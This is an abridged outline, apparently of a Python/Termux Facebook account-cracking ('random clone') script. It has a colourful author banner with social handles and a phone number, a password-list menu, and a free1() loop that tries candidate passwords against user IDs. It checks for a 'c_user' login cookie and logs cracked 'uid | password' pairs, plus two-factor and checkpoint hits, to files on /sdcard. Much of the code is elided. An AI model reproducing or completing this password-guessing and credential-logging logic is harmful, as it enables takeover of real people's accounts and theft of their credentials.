...
\033[1;31m│\033[1;32m☞  \033[1;32m𝐀𝐔𝐓𝐇𝐎𝐑     \033[1;31m➟   \033[1;32mADNAN WASIf\033[1;31m│

\033[1;31m│\033[1;32m☞  \033[1;32m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊   \033[1;31m➟   \033[1;32mADNAN WASIF\033[1;31m     │

\033[1;31m│\033[1;32m☞  \033[1;32m𝐆𝐈𝐓𝐇𝐔𝐁    \033[1;31m ➟   \033[1;32mAD3AN-143           \033[1;31m │

\033[1;31m│\033[1;32m☞  \033[1;32m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏  \033[1;31m ➟   \033[1;32m+8801758329292          \033[1;31m │

\033[1;31m│\033[1;32m☞  \033[1;32m𝐕𝐄𝐑𝐒𝐈𝐎𝐍   \033[1;31m ➟   \033[1;32m0.4                     \033[1;31m   │

\033[1;31m│\033[1;32m☞  \033[1;32m𝐘𝐎𝐔𝐓𝐔𝐁𝐄   \033[1;31m ➟   \033[1;32mBD-WORLD          \033[1;31m   │
...
def my_tool_security():
    ...
    print("\t  Facebook : MEHEDI HASAN AD3AN")

    print("\t  Fb page  : Feeling Sad")

    print("\t  Github   : AD3AN-143")
...
def xyz():
    ...
    os.system("play-audio WELCOME_TO_AD3AN_RANDOM_CLONE_TOOL.mp3")
...
def password():
    ...
    passX = input(f" {RED}CHOOSE{AD3AN2} : ")
...
def free1(uid,pwx,tl):
    ...
    try:
        ...
        for ps in pwx:
           ...
           "scheme": 'https',
            ...
            if 'c_user' in log_cookies:
                ...
                os.system("play-audio AD3AN_OK.mp3")

                print('\r\033[1;32m[AD3AN-OK] '+uid+' [√] '+ps+ '')

                cek_apk(session,coki)

                open('/sdcard/AD3AN-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    os.system("play-audio AD3AN_2F.mp3")

                    print('\r\033[1;34m[AD3AN-2F] '+uid+' [~] '+ps+' ')

                    open('/sdcard/AD3AN-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    ...
                    os.system("play-audio AD3AN_CP.mp3")

                    print(f'\r\033[1;30m[AD3AN-CP] '+uid+' [×] '+ps+ ' ')

                    open('/sdcard/AD3AN-CP.txt', 'a').write(uid+' | '+ps+'\n')
        ...
        sys.stdout.write(f'\r\33[1;37m[AD3AN 🔥] [%s] \33[1;97m[OK:%s{AD3AN2}CP:%s]'%(loop,len(ok),len(cp))), 
